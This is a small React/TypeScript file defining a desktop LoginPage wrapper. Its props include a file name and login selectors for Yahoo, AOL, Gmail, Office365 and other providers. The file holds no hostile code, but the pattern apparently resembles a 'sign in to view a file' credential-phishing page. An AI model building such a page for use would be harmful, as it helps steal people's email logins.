import React from 'react';
import LoginPageBase from './LoginPageBase';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
  onOthersSelect?: () => void;
  defaultProvider?: string;
}

const LoginPage: React.FC<LoginPageProps> = (props) => (
  <LoginPageBase variant="desktop" {...props} />
);

export default LoginPage;
